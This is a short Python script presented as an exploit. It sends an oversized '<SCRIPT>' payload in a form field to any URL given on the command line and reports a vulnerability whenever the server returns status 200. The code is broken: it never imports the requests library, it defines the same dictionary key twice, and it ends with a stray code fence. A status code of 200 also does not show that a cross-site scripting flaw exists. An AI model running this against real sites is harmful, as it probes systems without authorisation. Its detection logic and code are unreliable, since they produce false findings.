import sys

def exploit_vuln(url):
    payload = {
        "name": "<SCRIPT>",
        "name": "<SCRIPT>" + "<SCRIPT>" * 1000
    }
    response = requests.post(url, data=payload)
    if response.status_code == 200:
        print("[+] Vulnerability found")
    else:
        print("[-] Vulnerability not found")
    print(response.text)

if __name__ == "__main__":
    if len(sys.argv)!= 2:
        print("Usage: python exploit.py <url>")
        sys.exit()
    exploit_vuln(sys.argv[1])
```
